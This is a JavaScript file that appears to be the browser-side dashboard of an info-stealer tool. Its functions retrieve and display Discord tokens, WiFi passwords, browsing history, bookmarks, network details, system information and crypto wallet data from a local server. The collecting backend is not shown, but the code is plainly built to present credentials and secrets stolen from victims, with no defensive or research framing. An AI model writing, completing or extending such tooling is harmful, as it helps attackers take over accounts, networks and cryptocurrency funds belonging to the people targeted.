// Function to display output in a specific HTML element
function displayOutput(data, elementId) {
    const outputElement = document.getElementById(elementId);
    outputElement.innerText = JSON.stringify(data, null, 2); // Format JSON data for display
}

// Fetch and display Discord data
function retrieveDiscordData() {
    fetch('/discord_tokens')
        .then(response => response.json())
        .then(data => {
            displayOutput(data, 'output-discord');
        })
        .catch(error => {
            console.error('Error:', error);
            alert("Failed to retrieve Discord data.");
        });
}

// Fetch and display Bookmarks data
function retrieveBookmarks() {
    fetch('/web-history')
        .then(response => response.json())
        .then(data => {
            displayOutput(data, 'output-bookmarks');
        })
        .catch(error => {
            console.error('Error:', error);
            alert("Failed to retrieve Bookmarks.");
        });
}

// Fetch and display Browsing History data
function retrieveBrowsingHistory() {
    window.open('http://127.0.0.1:5000/web-history', '_blank');
}

// Fetch and display Network Details data
function retrieveNetworkDetails() {
    fetch('/retrieve-network-details')
        .then(response => response.json())
        .then(data => {
            displayOutput(data, 'output-network-details');
        })
        .catch(error => {
            console.error('Error:', error);
            alert("Failed to retrieve Network Details.");
        });
}

// Fetch and display WiFi Passwords data
function retrieveWifiPasswords() {
    window.open('http://127.0.0.1:5000/', '_blank');
}

// Fetch and display System Information data
function retrieveSystemInfo() {
    window.open('http://127.0.0.1:5000/system_info', '_blank');
}

// Fetch and display Wallet Data
function retrieveWalletData() {
    fetch('/retrieve-wallet-data')
        .then(response => response.json())
        .then(data => {
            displayOutput(data, 'output-wallet-data');
        })
        .catch(error => {
            console.error('Error:', error);
            alert("Failed to retrieve Wallet Data.");
        });
}
